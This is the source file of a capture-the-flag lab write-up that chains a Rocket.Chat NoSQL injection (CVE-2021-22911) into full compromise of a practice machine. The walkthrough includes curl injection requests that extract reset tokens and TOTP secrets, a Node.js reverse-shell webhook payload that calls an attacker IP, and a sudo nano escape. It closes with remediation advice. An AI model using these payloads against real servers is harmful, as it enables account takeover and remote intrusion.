@@ -1,0 +1,375 @@
+export const frontmatter = {
+  title: "Hacksmarter Exception Machine Writeup",
+  slug: "hacksmarter-exception-lab-writeup",
+  category: "Hack Smarter Lab",
+  description:
+    "Complete walkthrough of the Hacksmarter Exception machine, covering unauthenticated Rocket.Chat NoSQL injection (CVE-2021-22911), blind character-by-character token extraction, TOTP 2FA bypass, Remote Code Execution via incoming webhooks, lateral movement via credential reuse, and privilege escalation via an interactive sudo nano escape.",
+  date: "2026-05-26",
+};
+
+export const metadata = {
+  title:
+    "Hacksmarter Exception Writeup – Rocket.Chat NoSQL Injection to Root via Webhook RCE & Sudo Nano | loxcalhost",
+  description:
+    "Step-by-step Hacksmarter Exception writeup demonstrating unauthenticated NoSQL injection (CVE-2021-22911) in Rocket.Chat, 2FA secret extraction via $where clause injection, RCE via Node.js webhooks, SSH credential harvesting from database backups, and root privilege escalation through a misconfigured sudo log inspector binary.",
+};
+
+## Introduction
+
+This writeup details the penetration testing steps to compromise the Exception machine. The environment features a vulnerable instance of Rocket.Chat, which allows for unauthenticated NoSQL injection. By chaining this injection to extract password reset tokens and Multi-Factor Authentication (MFA) secrets, we achieve Remote Code Execution (RCE). Post-exploitation involves lateral movement through exposed database credentials and a final privilege escalation phase leveraging a misconfigured `sudo` permission on a custom binary that spawns the `nano` text editor.
+
+## Overview
+
+The Exception machine is a Linux-based target that emphasizes web application vulnerabilities, credential reuse, and system misconfigurations. The primary exploitation path relies heavily on CVE-2021-22911, a NoSQL injection flaw in Rocket.Chat. The engagement is broken down into three distinct phases: initial access via web exploitation, lateral movement via sensitive data exposure in backup files, and privilege escalation.
+
+## Attack Chain
+
+- **Information Gathering:** Port scanning reveals an SSH service and an Apache HTTP server acting as a reverse proxy for a Rocket.Chat instance running on port 3000.
+- **Vulnerability Identification:** Version enumeration of Rocket.Chat identifies it as version `3.12.1`, which is vulnerable to **CVE-2021-22911** (Unauthenticated NoSQL Injection).
+- **Information Disclosure:** An administrative email address (`localh0ste@exception.local`) is discovered in the public chat channels.
+- **Token Extraction:** A password reset is triggered for the admin email, and the reset token is extracted character-by-character using a blind NoSQL regex injection against the `getPasswordPolicy` endpoint.
+- **MFA Bypass**: A secondary authenticated NoSQL injection is used to leak the Time-based One-Time Password (TOTP) secret, granting full access to the admin account.
+- **Remote Code Execution:** An Incoming WebHook integration is created within Rocket.Chat to execute a Node.js reverse shell payload.
+- **Lateral Movement:** A plaintext backup file in the root directory exposes database credentials. The password is reused for the `Ron` user's SSH account.
+- **Privilege Escalation:** The `Ron` user has `sudo` privileges to run a log inspection tool. The tool opens logs using `nano`, allowing for command execution and a breakout to a root shell.
+
+## Setup
+
+Before initiating the enumeration process, you must establish a connection to the target network. Download the provided VPN configuration file and connect using OpenVPN.
+
+Run the following command in your terminal:
+```
+sudo openvpn challenge_lab_except.ovpn
+```
+
+To verify that the connection is active and the target is reachable, send a few ICMP echo requests to the target IP address:
+```
+ping -c 4 10.1.138.177
+```
+
+A successful output will show packets being transmitted and received without loss, confirming network reachability.
+
+## Enumeration
+
+Perform a Nmap port scan with version detection:
+```bash
+nmap -sV -T4 10.1.138.177
+```
+
+Output:
+```
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-22 15:33 IST
+Nmap scan report for 10.1.138.177
+Host is up (0.24s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
+3000/tcp open  ppp?
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 90.91 seconds
+```
+
+Scan the port `3000` of the target with `whatweb`:
+```bash
+http://10.1.138.177:3000 [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.1.138.177], Script[text/javascript], Title[Rocket.Chat (Chatty)], UncommonHeaders[x-content-type-options,x-instance-id], X-Frame-Options[sameorigin], X-UA-Compatible[IE=edge], X-XSS-Protection[1]
+```
+
+The version information for `rocket.chat` can be identified through the `/api/info` endpoint:
+
+```json
+{
+  "version": "3.12.1",
+  "success": true
+}
+```
+
+The identified version is vulnerable to [**CVE-2021-22911**](https://nvd.nist.gov/vuln/detail/CVE-2021-22911). This vulnerability exists due to improper input sanitization in the Rocket.Chat server, which allows unauthenticated NoSQL injection and can potentially lead to remote code execution (RCE).
+
+## Foothold
+
+Navigate to `http://10.1.138.177:3000/` and create a new account using the following credentials:
+
+```text
+Name: loxcalhost
+Email: loxcalhost@exeption.local
+Password: LOXCALHOST
+```
+
+After successfully registering and logging in, navigate to the Public section and open the `#general` channel. Inside the chat history, an email address was disclosed:
+```text
+localh0ste@exception.local
+```
+
+The discovered email appears to belong to a sensitive or administrative-level account and could potentially be leveraged during further exploitation of the Rocket.Chat instance.
+
+**Vulnerability Description**
+
+The application directly embedded attacker-supplied JSON into MongoDB queries, allowing injection of query operators such as `$regex`.
+
+This allowed an unauthenticated attacker to manipulate database queries and perform boolean-based inference attacks against sensitive fields, including password reset tokens.
+
+By iteratively modifying regex conditions and observing response differences, it was possible to enumerate the password reset token character by character.
+
+> **Technical Note: Token Isolation & Attack Timing**
+> 
+> The `$regex` injection in the `getPasswordPolicy` endpoint is confined exclusively to the reset token field. Because we cannot append user-specific filters to the database query, the database evaluates our regex against *all* active reset tokens.
+>
+> In theory, a high-traffic production environment with multiple simultaneous password resets could cause collisions, making the exploit unreliable. However, in a real-world attack scenario, a threat actor would easily bypass this limitation by intentionally timing the attack during off-hours (e.g., late at night or on weekends). 
+>
+> By triggering the admin password reset during a period of zero legitimate traffic, the attacker guarantees that their target token is the *only* active token in the database, ensuring the regex injection extracts the correct data without interference.
+
+A password reset request was sent for the discovered email account using the following request:
+
+```bash
+curl -X POST "http://10.1.138.177:3000/api/v1/method.callAnon/sendForgotPasswordEmail" \
+     -H "Content-Type: application/json" \
+     -d '{"message":"{\"msg\":\"method\",\"method\":\"sendForgotPasswordEmail\",\"params\":[\"localh0ste@exception.local \"]}"}' \
+     -k
+```
+
+Output:
+
+```json
+{"message":"{\"msg\":\"result\",\"result\":true}","success":true}
+```
+
+Since the request returned `true`, it confirms that a valid password reset token was generated for the account `localh0ste@exception.local`.
+
+
+At this stage, there are multiple possible approaches to obtain the generated password reset token. For this scenario, the token will be manually intercepted and retrieved using Caido(BurpSuite Alternative).
+
+In Caido, navigate to **Testing → Automate** and create the following request:
+
+```http
+POST /api/v1/method.callAnon/getPasswordPolicy HTTP/1.1
+Host: 10.1.138.177:3000
+Content-Type: application/json
+Content-Length: 123
+
+{
+  "message": "{\"msg\":\"method\",\"method\":\"getPasswordPolicy\",\"params\":[{\"token\":{\"$regex\":\"^char\"}}]}"
+}
+```
+
+Set the URL in the top-left input field to:
+```bash
+http://10.1.138.177:3000
+```
+
+Select the word `char` in the request body and click the `+` icon to create a placeholder.
+
+Next, generate a custom wordlist containing uppercase letters, lowercase letters, numbers, and special characters using:
+
+```bash
+printf "%s\n" {A..Z} {a..z} {0..9} - _ > wordlist.txt
+```
+
+Upload the generated `wordlist.txt` file through **Workspace → Files** using the **Upload** button located in the top-right corner.
+
+In the **Payloads** section, configure the uploaded `wordlist.txt` file as the payload source for the placeholder.
+
+Finally, under the **Settings** section, configure the following values:
+
+* **Delay:** `1000ms`
+* **Number of Workers:** `1`
+
+Then click **Run** and monitor the responses. Look for a change in response length compared to the baseline. In this case, the correct character was identified when the response length differed, specifically at a length of **539**.
+
+Once the correct character is found, this response length can be used as a filter condition for subsequent iterations. You can then refine the search by applying a filter such as:
+
+```text
+resp.len.eq:539
+```
+
+This allows isolating responses matching that exact length, making it easier to determine valid characters in each step of the token extraction process.
+
+> **NOTE:** This process must be repeated iteratively for each character of the token. The token length is 48 characters, meaning each position must be discovered sequentially. Once a character is identified, it should be appended before the placeholder in the payload to progressively build the full token.
+
+After successfully reconstructing the full reset token, the password for the account was updated using the following request:
+```bash
+curl -X POST http://10.1.138.177:3000/api/v1/method.callAnon/resetPassword \
+  -H "Content-Type: application/json" \
+  -d '{"message":"{\"msg\":\"method\",\"method\":\"resetPassword\",\"params\":[\"GH360q4Z0qesYCSVQ9ny9GLQfAcCVtz-2NJYiiA7iiu\",\"password12\"]}"}'
+```
+
+With the password reset complete, the login page was accessed using the new credentials. However, the system enforced a second-factor authentication step requiring a 6-digit authentication code.
+
+Since direct retrieval of the OTP was not possible, an injection-based approach was used to extract the TOTP secret for the admin user:
+```bash
+curl -g -G 'http://10.1.138.177:3000/api/v1/users.list' \
+  --data-urlencode 'query={"$where":"this.username===\"localh0ste\" && (()=>{ throw this.services.totp.secret })()"}' \
+  -H 'X-User-Id: Np9c8qhvRxwTWKCAT' \
+  -H 'X-Auth-Token: jkEklewRg81qiIGFW7rhpno2b-_6fRfXLMs7YuvoSAf'
+```
+
+> **NOTE:** The `X-User-Id` and `X-Auth-Token` values can be obtained after logging into the account created at the beginning of the process. These values are included in authenticated session requests and can be extracted from the browser’s local storage or network traffic after successful login.
+
+Output:
+```json
+{"success":false,"error":"uncaught exception: KIYTUQZKO4YD6ZJYEUWFAMB4OBAU6I3RJBCXMP3UGJHEOOBJGNLQ"}
+```
+
+The response contained the TOTP secret, which was then added to an authenticator application to generate valid one-time passwords.
+
+Using the generated OTP, authentication was completed successfully, resulting in access to the system as the administrator user.
+
+After successfully logging in, navigate to **Settings → Integrations** and create a new **Incoming WebHook** integration.
+
+Configure the integration with the following parameters:
+```text
+Name: rce
+Post to Channel: #general
+Post as: localh0ste
+```
+
+Enable the **Script Enabled** option and add the following script payload:
+```javascript
+const require = console.log.constructor('return process.mainModule.require')();
+const net = require('net');
+const spawn = require('child_process').spawn;
+
+const client = new net.Socket();
+client.connect(4444, '10.200.59.46', () => {
+    const sh = spawn('/bin/sh', []);
+    client.pipe(sh.stdin);
+    sh.stdout.pipe(client);
+    sh.stderr.pipe(client);
+});
+```
+
+> **NOTE:** Ensure that the IP address used in the payload is updated to match the attacker machine’s current IP address before triggering the webhook. This is required so that the reverse connection is correctly routed back to the listener.
+
+Start a Netcat listener on the attack machine to receive the reverse shell connection:
+```bash
+nc -lvnp 4444
+```
+
+After the listener is active, trigger the webhook endpoint using the following request:
+```bash
+curl http://10.1.138.177:3000/hooks/p2dzQmurrnPqaxm7Q/6SM9snAXfGjCdtLnHM7F3nwDc7xfWFxbaJah6xtWguw6to3j
+```
+
+Once executed, the webhook will trigger the configured integration script, resulting in an outbound connection to the listener and granting shell access on the target system.
+
+
+## Lateral Movement
+
+Once a shell was obtained through the Netcat listener, the contents of the root directory were enumerated using:
+```bash
+ls /
+```
+
+The command returned the following output:
+```text
+Backup_db.txt
+app
+bin
+boot
+dev
+etc
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+```
+
+Among the listed files, `Backup_db.txt` appeared interesting and potentially sensitive. Viewing the file contents revealed database credentials:
+```text
+DATABASE_USER=Ron
+DATABASE_PASSWORD=AtentiouSenoU
+DATABASE_NAME=chatty
+DATABASE_HOST=localhost
+```
+
+The file contains credentials for the database user and password. During further enumeration, it was also identified that the target was running an SSH service. Since password reuse is a common misconfiguration, the discovered credentials were tested against the SSH service in an attempt to gain authenticated access to the system.
+
+Using the discovered credentials, an SSH connection was established to the target system:
+```bash
+ssh Ron@10.1.138.177
+```
+
+When prompted for the password, the previously identified password `AtentiouSenoU` was entered. The credentials were successfully reused, granting SSH access to the machine as the user `Ron`.
+
+After obtaining a shell on the target system, the user flag can be retrieved by reading the flag file located in the user’s home directory:
+
+```bash
+cat /home/Ron/user.txt
+```
+
+Output:
+
+```text
+▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
+```
+
+
+## Privilege Escalation
+
+With `sudo -l` we can view the list of commands and privileges that the current user `Ron` is allowed to run with `sudo`:
+```
+Matching Defaults entries for Ron on Chatty:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User Ron may run the following commands on Chatty:
+    (root) NOPASSWD: /opt/log_inspector/check_log --clean
+```
+
+We can use `file` command to identify the type of file for `/opt/log_inspector/check_log`:
+```text
+/opt/log_inspector/check_log: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9afff3e86d2fb0228defb815a2e9b590ae33c24f, for GNU/Linux 3.2.0, not stripped
+```
+
+The output reveals an executable file named `check_log`, and the `sudo -l` results show that the user is permitted to execute it with the `--clean` argument:
+
+```bash
+sudo /opt/log_inspector/check_log --clean
+```
+
+Upon executing the command, a `nano` text editor was opened with elevated privileges.
+
+> **NOTE:** In `nano`, pressing `Ctrl+T` allows command execution, and the output is displayed inside the editor buffer.
+
+Since the `check_log` binary was executed with `sudo`, any commands run through this feature would execute with `root` privileges. This can be abused to read sensitive files such as the root flag:
+
+```bash
+cat /root/root.txt
+```
+
+Output:
+
+```
+▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
+```
+
+## Remediation & Recommendations
+
+To secure the system against the attacks demonstrated in this chain, the following remediations should be applied:
+- **Update Rocket.Chat:** The software must be upgraded to the latest stable release. **CVE-2021-22911** was patched in versions 3.12.4, 3.13.3, and 3.14.0. Updating ensures input sanitization is correctly handled for MongoDB queries.
+- **Remove Sensitive Files:** Clear plaintext credentials and sensitive configuration backups, such as `Backup_db.txt`, from accessible directories. Secure password management solutions should be used instead.
+- **Enforce Password Uniqueness:** Implement policies that prevent users from reusing passwords across different services. The database password should never match a user's SSH password.
+- **Restrict Sudo Privileges:** The sudo configuration allowing the execution of `/opt/log_inspector/check_log` must be revised. If `nano` or another interactive editor is required by the script, its built-in command execution features must be restricted (e.g., invoking `nano` in restricted mode with `rnano`). Alternatively, the script should use non-interactive pagers like `cat` or `tail` to prevent elevated arbitrary command execution from within the text editor.
+
+## MITRE ATT&CK Mapping
+
+Tactic | Technique | ID | Description
+------|----------|----|------------
+Reconnaissance | Active Scanning | T1595 | Scanning ports and enumerating software versions via Nmap.
+Initial Access | Exploit Public-Facing Application | T1190 | Exploiting the Rocket.Chat NoSQL injection vulnerability.
+Credential Access | Steal Web Session Cookie/Token | T1539 | Extracting password reset tokens and TOTP secrets via database injection.
+Execution | Command and Scripting Interpreter | T1059 | Using the Rocket.Chat webhook integration to execute a Node.js shell.
+Lateral Movement | Remote Services: SSH | T1021.004 | Reusing exposed credentials to authenticate via SSH.
+Privilege Escalation | Abuse Elevation Control Mechanism | T1548.003 | Exploiting sudo privileges on a binary that calls an interactive text editor.
